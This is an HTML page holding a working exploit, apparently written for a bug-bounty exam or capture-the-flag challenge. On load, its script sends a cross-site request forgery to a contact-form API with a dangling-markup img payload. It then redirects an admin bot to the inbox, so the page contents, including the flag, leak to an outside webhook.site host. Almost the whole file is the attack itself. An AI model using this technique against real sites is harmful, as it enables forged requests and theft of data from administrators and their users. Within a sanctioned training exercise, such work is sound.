<!DOCTYPE html>
<html>
<head>
    <title>Bug Report System</title>
</head>
<body>
    <h1>Processing... Please wait.</h1>
    <script>
        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
        const webhook = "https://webhook.site/ea019a0a-1118-44a3-8caf-95a90cd5d271";

        // This payload uses an open 'src' attribute. 
        // It will capture the HTML of the page (where the flag is) 
        // and send it as part of the URL to your webhook.
        const danglingPayload = `<img src="${webhook}/leak?data=`;

        async function launchExploit() {
            try {
                // Step 1: Submit the payload via CSRF
                await fetch(targetApi, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        "name": "Saja",
                        "email": "research@seoulaura.com",
                        "subject": "Urgent formatting issue",
                        "message": danglingPayload,
                        "category": "technical",
                        "priority": "high"
                    })
                });

                // Step 2: Redirect the admin to the inbox 
                // so they actually view the message and trigger the leak.
                setTimeout(() => {
                    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
                }, 1000);
            } catch (e) {
                // If fetch fails, the bot might still follow the redirect
                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
            }
        }

        launchExploit();
    </script>
</body>
</html>
